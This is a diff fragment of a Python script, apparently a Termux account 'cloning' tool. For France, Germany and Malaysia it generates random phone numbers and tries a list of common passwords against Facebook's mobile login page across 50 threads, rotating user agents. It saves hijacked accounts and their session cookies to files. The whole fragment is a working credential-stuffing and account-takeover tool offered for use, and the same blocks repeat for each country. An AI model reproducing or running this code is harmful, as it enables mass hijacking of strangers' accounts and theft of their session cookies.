+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+45"
-		os.system('clear')
-		print(logo)
-		print(logo23)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def france():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo24)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+33"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo24)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+33"
-		os.system('clear')
-		print(logo)
-		print(logo24)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def germany():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo25)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+49"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo25)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+49"
-		os.system('clear')
-		print(logo)
-		print(logo25)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def malaysia():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo26)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+60"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo26)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+60"
-		os.system('clear')
-		print(logo)
-		print(logo26)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
